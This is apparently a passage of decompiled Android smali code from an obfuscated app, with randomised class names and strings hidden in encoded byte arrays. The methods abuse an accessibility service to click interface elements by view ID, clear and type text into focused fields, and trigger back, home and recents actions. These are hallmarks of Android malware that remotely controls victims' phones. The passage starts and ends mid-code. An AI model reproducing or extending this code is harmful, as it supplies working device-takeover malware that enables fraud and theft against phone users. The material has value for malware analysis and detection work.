        -0x14t
        -0x5ft
        0x7et
        -0x71t
        -0xet
        0x7dt
        0x7ft
        -0x4dt
    .end array-data

    :array_3
    .array-data 1
        -0x2t
        0x1ct
        -0x6t
        -0x7at
        0x9t
        0x10t
        -0x23t
        -0x65t
    .end array-data

    :array_4
    .array-data 1
        -0x18t
        0x75t
        -0x42t
        0x1dt
        0x75t
        0x38t
        -0x3t
        -0x77t
        -0x1ct
        0x73t
        -0x49t
        0x1dt
        0x64t
        0x37t
        -0x6t
        -0x70t
        -0x16t
        0x7dt
        -0x4at
        0x5at
        0x7at
        0x25t
        -0x13t
        -0x66t
        -0x19t
        0x76t
        -0x4at
        0x41t
        0x2et
        0x3ft
        -0x3t
        -0x2ct
        -0x5t
        0x7ft
        -0x5ft
        0x5et
        0x7dt
        0x25t
        -0x16t
        -0x6et
        -0x1ct
        0x74t
        -0x74t
        0x52t
        0x78t
        0x3at
        -0xat
        -0x74t
        -0x2ct
        0x7bt
        -0x41t
        0x44t
        0x75t
        0x2ft
        -0x16t
        -0x5ct
        -0x17t
        0x6ft
        -0x59t
        0x47t
        0x7bt
        0x38t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x75t
        0x1at
        -0x2dt
        0x33t
        0x14t
        0x56t
        -0x67t
        -0x5t
    .end array-data

    :array_6
    .array-data 1
        -0x50t
        -0x35t
        0x71t
        -0x28t
        -0x36t
        -0x58t
        -0x1dt
        -0x70t
        -0x44t
        -0x33t
        0x78t
        -0x28t
        -0x25t
        -0x59t
        -0x1ct
        -0x77t
        -0x4et
        -0x3dt
        0x79t
        -0x61t
        -0x3bt
        -0x4bt
        -0xdt
        -0x7dt
        -0x41t
        -0x38t
        0x79t
        -0x7ct
        -0x6ft
        -0x51t
        -0x1dt
        -0x33t
        -0x5dt
        -0x3ft
        0x6et
        -0x65t
        -0x3et
        -0x4bt
        -0xct
        -0x75t
        -0x44t
        -0x36t
        0x43t
        -0x69t
        -0x39t
        -0x56t
        -0x18t
        -0x6bt
        -0x74t
        -0x3et
        0x73t
        -0x7ct
        -0x32t
        -0x5ft
        -0xbt
        -0x73t
        -0x5at
        -0x36t
        0x78t
        -0x57t
        -0x3ct
        -0x58t
        -0x15t
        -0x65t
        -0x74t
        -0x3at
        0x69t
        -0x7et
        -0x21t
        -0x57t
        -0x17t
    .end array-data

    :array_7
    .array-data 1
        -0x2dt
        -0x5ct
        0x1ct
        -0xat
        -0x55t
        -0x3at
        -0x79t
        -0x1et
    .end array-data

    :array_8
    .array-data 1
        0x3t
        -0x30t
        0x25t
        0x4dt
        -0x1ft
        0x10t
        -0x72t
        0x66t
        0xft
        -0x2at
        0x2ct
        0x4dt
        -0x10t
        0x1bt
        -0x68t
        0x79t
        0x9t
        -0x34t
        0x3bt
        0xat
        -0x11t
        0x10t
        -0x77t
        0x7bt
        0xet
        -0x35t
        0x3at
        0xct
        -0x14t
        0x12t
        -0x71t
        0x66t
        0x5at
        -0x2at
        0x2ct
        0x4ct
        -0x10t
        0x1bt
        -0x68t
        0x79t
        0x9t
        -0x34t
        0x3bt
        0xat
        -0x11t
        0x10t
        -0x4bt
        0x75t
        0xct
        -0x2dt
        0x27t
        0x14t
        -0x21t
        0x18t
        -0x7bt
        0x66t
        0x5t
        -0x28t
        0x3at
        0xct
        -0xbt
        0x10t
        -0x72t
        0x4bt
        0xft
        -0x2ft
        0x24t
        0x1at
        -0x21t
        0x1ct
        -0x61t
        0x60t
        0x14t
        -0x30t
        0x26t
    .end array-data

    :array_9
    .array-data 1
        0x60t
        -0x41t
        0x48t
        0x63t
        -0x80t
        0x7et
        -0x16t
        0x14t
    .end array-data

    :array_a
    .array-data 1
        -0x3ft
        0x58t
        0x2ct
        -0x44t
        0x70t
        -0x26t
        0x54t
        -0x6dt
        -0x33t
        0x5et
        0x25t
        -0x44t
        0x62t
        -0x2ft
        0x44t
        -0x6bt
        -0x35t
        0x59t
        0x26t
        -0x1ft
        0x2bt
        -0x23t
        0x54t
        -0x32t
        -0x3dt
        0x54t
        0x35t
        -0x5t
        0x7et
        -0x26t
        0x6ft
        -0x7dt
        -0x29t
        0x43t
        0x35t
        -0x3t
        0x7ft
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x5et
        0x37t
        0x41t
        -0x6et
        0x11t
        -0x4ct
        0x30t
        -0x1ft
    .end array-data

    :array_c
    .array-data 1
        0x51t
        0x23t
        0xft
        -0x15t
        0x56t
        -0x8t
        -0x7ft
        0x73t
        0x5dt
        0x25t
        0x6t
        -0x15t
        0x44t
        -0xdt
        -0x6ft
        0x75t
        0x5bt
        0x22t
        0x5t
        -0x4at
        0xdt
        -0x1t
        -0x7ft
        0x2et
        0x53t
        0x20t
        0xet
        -0x56t
        0x40t
        -0x37t
        -0x79t
        0x74t
        0x46t
        0x38t
        0xdt
        -0x55t
    .end array-data

    :array_d
    .array-data 1
        0x32t
        0x4ct
        0x62t
        -0x3bt
        0x37t
        -0x6at
        -0x1bt
        0x1t
    .end array-data

    :array_e
    .array-data 1
        -0x17t
        0x71t
        0x66t
        0x75t
        0x33t
        -0x52t
        -0x12t
        -0x49t
        -0x7t
        0x7bt
        0x68t
        0x2et
        0x2dt
        -0x5bt
        -0x1t
        -0x20t
        -0x5ct
        0x73t
        0x62t
        0x2et
        0x36t
        -0xat
        -0x1et
        -0x3t
        -0x5bt
        0x6et
        0x6et
        0x29t
        0x32t
        -0x5bt
        -0x8t
        -0x16t
        -0x1dt
        0x71t
        0x65t
        0x4t
        0x3et
        -0x60t
        -0x19t
        -0xat
        -0x3t
        0x41t
        0x6dt
        0x34t
        0x2dt
        -0x57t
        -0x14t
        -0x15t
        -0x1bt
        0x6bt
        0x65t
        0x3ft
        0x0t
        -0x5dt
        -0x1bt
        -0xbt
        -0xdt
        0x41t
        0x69t
        0x2et
        0x2bt
        -0x48t
        -0x1ct
        -0x9t
    .end array-data

    :array_f
    .array-data 1
        -0x76t
        0x1et
        0xbt
        0x5bt
        0x5ft
        -0x34t
        -0x75t
        -0x67t
    .end array-data

    :array_10
    .array-data 1
        0x7ft
        0x24t
        -0x48t
        0x4ct
        -0x4bt
        -0x1dt
        -0x41t
        0x3t
        0x10t
        0x31t
        -0x42t
        0x54t
        -0x44t
        -0x50t
        -0x5ct
        0xat
        0x60t
        0x3ft
        -0x5et
        0x5dt
    .end array-data

    :array_11
    .array-data 1
        0x3ft
        0x52t
        -0x2ft
        0x3at
        -0x26t
        -0x27t
        -0x2at
        0x67t
    .end array-data

    :array_12
    .array-data 1
        -0x3ct
        0x5bt
        -0x31t
        -0x71t
        0x3bt
        0x76t
        0x38t
        -0x4bt
        -0x34t
        0x51t
        -0x7ct
        -0x61t
        0x21t
        0x6bt
        0x28t
        -0x20t
        -0x35t
        0x4t
    .end array-data

    nop

    :array_13
    .array-data 1
        -0x5bt
        0x35t
        -0x55t
        -0x3t
        0x54t
        0x1ft
        0x5ct
        -0x71t
    .end array-data

    :array_14
    .array-data 1
        0x28t
        0x61t
        0x11t
        0x1t
        0x70t
        0x77t
        -0x5dt
        -0x15t
        0x24t
        0x67t
        0x18t
        0x1t
        0x62t
        0x7ct
        -0x4dt
        -0x13t
        0x22t
        0x60t
        0x1bt
        0x5ct
        0x2bt
        0x70t
        -0x5dt
        -0x4at
        0x3bt
        0x6bt
        0xet
        0x42t
        0x78t
        0x6at
        -0x4ct
        -0x10t
        0x24t
        0x60t
        0x23t
        0x4et
        0x7dt
        0x75t
        -0x58t
        -0x12t
        0x14t
        0x6ct
        0x9t
        0x5bt
        0x65t
        0x76t
        -0x57t
    .end array-data

    :array_15
    .array-data 1
        0x4bt
        0xet
        0x7ct
        0x2ft
        0x11t
        0x19t
        -0x39t
        -0x67t
    .end array-data

    :array_16
    .array-data 1
        0x5bt
        -0x5ft
        0x32t
        -0x72t
        0x2t
        -0x27t
        -0x38t
        -0xdt
        0x57t
        -0x59t
        0x3bt
        -0x72t
        0x13t
        -0x2et
        -0x22t
        -0x14t
        0x51t
        -0x43t
        0x2ct
        -0x37t
        0xct
        -0x27t
        -0x31t
        -0x12t
        0x56t
        -0x46t
        0x2dt
        -0x31t
        0xft
        -0x25t
        -0x37t
        -0xdt
        0x2t
        -0x59t
        0x3bt
        -0x71t
        0x13t
        -0x2et
        -0x22t
        -0x14t
        0x51t
        -0x43t
        0x2ct
        -0x37t
        0xct
        -0x27t
        -0xdt
        -0x20t
        0x54t
        -0x5et
        0x30t
        -0x29t
        0x3ct
        -0x2bt
        -0x27t
        -0xbt
        0x4ct
        -0x5ft
        0x31t
    .end array-data

    :array_17
    .array-data 1
        0x38t
        -0x32t
        0x5ft
        -0x60t
        0x63t
        -0x49t
        -0x54t
        -0x7ft
    .end array-data

    :array_18
    .array-data 1
        0x6t
        0x30t
        -0x4bt
        -0x4ct
        -0x55t
        0x1et
        0x40t
        0x3ft
        0xct
        0x2bt
        -0x5ft
        -0x4dt
        -0x1bt
    .end array-data

    nop

    :array_19
    .array-data 1
        0x6bt
        0x59t
        -0x40t
        -0x23t
        -0x6ft
        0x77t
        0x24t
        0x10t
    .end array-data

    :array_1a
    .array-data 1
        -0x9t
        -0x32t
        0x3t
        -0x7et
        -0x4ft
        0x69t
        -0x4t
        -0x71t
        -0x8t
        -0x2et
        0x2t
        -0x61t
        -0x1ct
        0x6et
        -0x56t
    .end array-data

    :array_1b
    .array-data 1
        -0x66t
        -0x59t
        0x76t
        -0x15t
        -0x75t
        0x0t
        -0x68t
        -0x60t
    .end array-data

    :array_1c
    .array-data 1
        0xat
        -0x38t
        0x5et
        0x7dt
        -0x1ft
        0x25t
        -0xft
        0x1at
        0x6t
        -0x3et
        0x5ft
        0x7dt
        -0x4ct
        0x22t
        -0x36t
        0x45t
        0x8t
        -0x2et
        0x42t
        0x60t
        -0x4et
        0x3at
        -0x10t
    .end array-data

    :array_1d
    .array-data 1
        0x67t
        -0x5ft
        0x2bt
        0x14t
        -0x25t
        0x4ct
        -0x6bt
        0x35t
    .end array-data

    :array_1e
    .array-data 1
        0x5et
        0x16t
        -0x54t
        0x55t
        0x57t
        0x23t
        -0x3et
        0x67t
        0x56t
        0x1ct
        -0x19t
        0x46t
        0x5dt
        0x38t
        -0x2ct
        0x2t
        0x48t
        0x19t
        -0x5ft
        0x53t
    .end array-data

    :array_1f
    .array-data 1
        0x3ft
        0x78t
        -0x38t
        0x27t
        0x38t
        0x4at
        -0x5at
        0x5dt
    .end array-data

    :array_20
    .array-data 1
        -0x7at
        0x61t
        -0x60t
        -0x40t
        0x31t
        0x71t
        0x5at
        0x7ct
        -0x6at
        0x6bt
        -0x52t
        -0x65t
        0x2ft
        0x7at
        0x4bt
        0x2bt
        -0x35t
        0x63t
        -0x5ct
        -0x65t
        0x34t
        0x29t
        0x56t
        0x36t
        -0x36t
        0x6ct
        -0x48t
        -0x66t
        0x29t
        0x7ct
        0x51t
        0x2t
        -0x7ct
        0x60t
        -0x58t
        -0x7et
    .end array-data

    :array_21
    .array-data 1
        -0x1bt
        0xet
        -0x33t
        -0x12t
        0x5dt
        0x13t
        0x3ft
        0x52t
    .end array-data

    :array_22
    .array-data 1
        0x3t
        -0x7t
        0x51t
        0x11t
        0x2ct
        0x5et
        -0x2ft
        0x6t
        0xbt
        -0xdt
        0x1at
        0x17t
        0x2at
        0x43t
        -0x27t
        0x59t
    .end array-data

    :array_23
    .array-data 1
        0x62t
        -0x69t
        0x35t
        0x63t
        0x43t
        0x37t
        -0x4bt
        0x3ct
    .end array-data
.end method

.method public static i(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 6

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    if-nez p0, :cond_2

    return-void

    :cond_2
    const/4 v0, 0x3

    :try_start_0
    new-array v1, v0, [Ljava/lang/String;

    const/16 v2, 0x12

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v4, 0x0

    aput-object v2, v1, v4

    const/16 v2, 0x14

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v5, v3, [B

    fill-array-data v5, :array_3

    invoke-static {v2, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x1

    aput-object v2, v1, v5

    const/16 v2, 0x3b

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v3, v3, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x2

    aput-object v2, v1, v3

    :goto_0
    if-ge v4, v0, :cond_4

    aget-object v2, v1, v4

    invoke-virtual {p0, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    :goto_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_3

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v5, 0x10

    invoke-virtual {v3, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_1

    :cond_3
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :catch_0
    :cond_4
    return-void

    nop

    :array_0
    .array-data 1
        0x2bt
        -0x6at
        -0x4ft
        -0x30t
        0x49t
        -0x44t
        -0x63t
        -0x5at
        0x23t
        -0x64t
        -0x6t
        -0x40t
        0x53t
        -0x5ft
        -0x73t
        -0xdt
        0x24t
        -0x37t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x4at
        -0x8t
        -0x2bt
        -0x5et
        0x26t
        -0x2bt
        -0x7t
        -0x64t
    .end array-data

    :array_2
    .array-data 1
        0x44t
        0x4ct
        -0x10t
        -0x6t
        -0x1ct
        -0x8t
        0x36t
        0x57t
        0x53t
        0x49t
        -0x16t
        -0x6t
        -0x57t
        -0x32t
        0x30t
        0xdt
        0x46t
        0x51t
        -0x17t
        -0x5t
    .end array-data

    :array_3
    .array-data 1
        0x32t
        0x25t
        -0x7at
        -0x6bt
        -0x22t
        -0x6ft
        0x52t
        0x78t
    .end array-data

    :array_4
    .array-data 1
        -0x32t
        0xdt
        -0x4t
        -0x47t
        0x7t
        -0x7dt
        -0x41t
        -0x37t
        -0x3et
        0xbt
        -0xbt
        -0x47t
        0x16t
        -0x78t
        -0x57t
        -0x2at
        -0x3ct
        0x11t
        -0x1et
        -0x2t
        0x9t
        -0x7dt
        -0x48t
        -0x2ct
        -0x3dt
        0x16t
        -0x1dt
        -0x8t
        0xat
        -0x7ft
        -0x42t
        -0x37t
        -0x69t
        0xbt
        -0xbt
        -0x48t
        0x16t
        -0x78t
        -0x57t
        -0x2at
        -0x3ct
        0x11t
        -0x1et
        -0x2t
        0x9t
        -0x7dt
        -0x7ct
        -0x26t
        -0x3ft
        0xet
        -0x2t
        -0x20t
        0x39t
        -0x71t
        -0x52t
        -0x31t
        -0x27t
        0xdt
        -0x1t
    .end array-data

    :array_5
    .array-data 1
        -0x53t
        0x62t
        -0x6ft
        -0x69t
        0x66t
        -0x13t
        -0x25t
        -0x45t
    .end array-data
.end method

.method static j()V
    .locals 6

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-virtual {v0}, Landroid/content/Context;->getResources()Landroid/content/res/Resources;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v0

    iget v1, v0, Landroid/util/DisplayMetrics;->heightPixels:I

    iget v0, v0, Landroid/util/DisplayMetrics;->widthPixels:I

    int-to-double v2, v0

    const-wide v4, 0x3fedc28f5c28f5c3L    # 0.93

    mul-double/2addr v2, v4

    double-to-int v0, v2

    invoke-static {v0, v1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->k(II)V

    return-void
.end method

.method private static k(II)V
    .locals 0

    .line 1
    invoke-static {p0, p1}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    return-void
.end method

.method public static l(Ljava/lang/String;)V
    .locals 11

    .line 1
    :try_start_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-nez v0, :cond_2

    return-void

    :cond_2
    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findFocus(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-nez v1, :cond_3

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    return-void

    :catch_0
    move-exception p0

    goto :goto_1

    :cond_3
    new-instance v2, Landroid/os/Bundle;

    invoke-direct {v2}, Landroid/os/Bundle;-><init>()V

    const/16 v3, 0x25

    new-array v4, v3, [B

    fill-array-data v4, :array_0

    const/16 v5, 0x8

    new-array v6, v5, [B

    fill-array-data v6, :array_1

    invoke-static {v4, v6}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v4

    const-string v6, ""

    invoke-virtual {v2, v4, v6}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    const/high16 v4, 0x200000

    invoke-virtual {v1, v4, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {p0}, Ljava/lang/String;->toCharArray()[C

    move-result-object p0

    array-length v6, p0

    const/4 v7, 0x0

    :goto_0
    if-ge v7, v6, :cond_4

    aget-char v8, p0, v7

    invoke-virtual {v2, v8}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    new-instance v8, Landroid/os/Bundle;

    invoke-direct {v8}, Landroid/os/Bundle;-><init>()V

    new-array v9, v3, [B

    fill-array-data v9, :array_2

    new-array v10, v5, [B

    fill-array-data v10, :array_3

    invoke-static {v9, v10}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v8, v9, v10}, Landroid/os/Bundle;->putCharSequence(Ljava/lang/String;Ljava/lang/CharSequence;)V

    invoke-virtual {v1, v4, v8}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(ILandroid/os/Bundle;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    const-wide/16 v8, 0x64

    :try_start_1
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_1
    add-int/lit8 v7, v7, 0x1

    goto :goto_0

    :cond_4
    :try_start_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_2

    :goto_1
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x3et
        0x21t
        -0x7dt
        -0x5ct
        0x3et
        0x3et
        -0x47t
        -0x37t
        -0x2ft
        0x25t
        -0x7et
        -0x60t
        0x34t
        0x3et
        -0x4et
        -0x29t
        -0x30t
        0x27t
        -0x7dt
        -0x4et
        0x25t
        0x35t
        -0x42t
        -0x24t
        -0x24t
        0x21t
        -0x61t
        -0x54t
        0x23t
        0x23t
        -0x5dt
        -0x27t
        -0x2at
        0x27t
        -0x67t
        -0x52t
        0x34t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x7dt
        0x62t
        -0x29t
        -0x13t
        0x71t
        0x70t
        -0x1at
        -0x78t
    .end array-data

    :array_2
    .array-data 1
        0x36t
        0x5dt
        -0x34t
        -0x41t
        0x3at
        -0x43t
        -0x56t
        -0x1bt
        0x25t
        0x59t
        -0x33t
        -0x45t
        0x30t
        -0x43t
        -0x5ft
        -0x5t
        0x24t
        0x5bt
        -0x34t
        -0x57t
        0x21t
        -0x4at
        -0x53t
        -0x10t
        0x28t
        0x5dt
        -0x30t
        -0x49t
        0x27t
        -0x60t
        -0x50t
        -0xbt
        0x22t
        0x5bt
        -0x2at
        -0x4bt
        0x30t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x77t
        0x1et
        -0x68t
        -0xat
        0x75t
        -0xdt
        -0xbt
        -0x5ct
    .end array-data
.end method

.method public static m()V
    .locals 4

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-eqz v0, :cond_0

    const/4 v1, 0x1

    new-array v1, v1, [B

    const/4 v2, 0x0

    const/16 v3, -0x41

    aput-byte v3, v1, v2

    const/16 v2, 0x8

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Integer;->intValue()I

    move-result v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :cond_0
    return-void

    nop

    :array_0
    .array-data 1
        -0x79t
        0x3dt
        0x6et
        -0x40t
        0x10t
        0x66t
        -0xft
        0x7et
    .end array-data
.end method

.method public static n(Ljava/lang/String;)V
    .locals 7

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v0

    if-nez v0, :cond_1

    return-void

    :cond_1
    invoke-virtual {p0}, Ljava/lang/String;->hashCode()I

    move-result v1

    const/16 v2, 0xd07

    const/4 v3, 0x1

    const/16 v4, 0x8

    const/4 v5, 0x3

    const/4 v6, 0x2

    if-eq v1, v2, :cond_4

    const v2, 0x17c0c

    if-eq v1, v2, :cond_3

    const v2, 0x1b890

    if-eq v1, v2, :cond_2

    goto :goto_0

    :cond_2
    new-array v1, v5, [B

    fill-array-data v1, :array_0

    new-array v2, v4, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_5

    move p0, v3

    goto :goto_1

    :cond_3
    new-array v1, v5, [B

    fill-array-data v1, :array_2

    new-array v2, v4, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_5

    move p0, v6

    goto :goto_1

    :cond_4
    new-array v1, v6, [B

    fill-array-data v1, :array_4

    new-array v2, v4, [B

    fill-array-data v2, :array_5

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_5

    const/4 p0, 0x0

    goto :goto_1

    :cond_5
    :goto_0
    const/4 p0, -0x1

    :goto_1
    if-eqz p0, :cond_8

    if-eq p0, v3, :cond_7

    if-eq p0, v6, :cond_6

    goto :goto_2

    :cond_6
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {p0, v3}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_2

    :cond_7
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {p0, v5}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    goto :goto_2

    :cond_8
    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cg0;->g(Landroid/content/Context;)Z

    move-result p0

    if-nez p0, :cond_9

    const/4 p0, 0x0

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->t(Landroid/content/Context;)V

    :cond_9
    sget-object p0, Lcom/vknnolqo/p9sv5zvf/GBPjHfKu;->j:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {p0, v6}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    :goto_2
    return-void

    :array_0
    .array-data 1
        -0x28t
        -0x43t
        0x2t
    .end array-data

    :array_1
    .array-data 1
        -0x56t
        -0x28t
        0x61t
        -0x13t
        -0x2ct
        0x39t
        -0x3dt
        -0x2dt
    .end array-data

    :array_2
    .array-data 1
        0x6ft
        0x1bt
        0xct
    .end array-data

    :array_3
    .array-data 1
        0xdt
        0x7at
        0x67t
        -0x13t
        0x34t
        -0x27t
        -0x48t
        -0x34t
    .end array-data

    :array_4
    .array-data 1
        -0x69t
        0x6et
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x1t
        0x1t
        0x1dt
        0x17t
        -0x6at
        0x10t
        0x4et
        0x11t
    .end array-data
.end method

.method public static o()V
    .locals 3

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->J()Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    move-result-object v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->K()Landroid/content/Context;

    move-result-object v1

    if-nez v1, :cond_1

    return-void

    :cond_1
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1e

    if-ge v1, v2, :cond_2

    return-void

    :cond_2
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getWindows()Ljava/util/List;

    move-result-object v1

    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_3

    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getWindowId()I

    move-result v1

